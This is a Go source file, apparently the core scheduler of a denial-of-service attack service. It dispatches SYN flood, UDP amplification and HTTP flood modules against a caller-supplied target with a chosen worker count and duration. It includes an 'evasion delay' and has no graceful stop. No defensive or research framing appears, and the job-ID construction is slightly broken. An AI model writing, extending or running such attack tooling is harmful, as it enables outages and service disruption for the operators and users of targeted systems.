package core

import (
	"orchardnet-api/modules/httpflood"
	"orchardnet-api/modules/synflood"
	"orchardnet-api/modules/udpamp"
	"time"
)

var jobCounter int64 = 0

func ScheduleAttack(target, attackType string, workers, duration int) string {
	jobCounter++
	jobID := "job_" + time.Now().Format("20060102150405") + "_" + string(rune(jobCounter%1000))

	go func() {
		time.Sleep(500 * time.Millisecond) // Evasion delay

		switch attackType {
		case "syn":
			synflood.Launch(target, 443, workers)
		case "udp":
			udpamp.Launch(target, workers)
		case "http":
			httpflood.Launch(target, workers)
		default:
			return
		}

		time.Sleep(time.Duration(duration) * time.Second)
		// No graceful stop — workers die on container exit
	}()

	return jobID
}
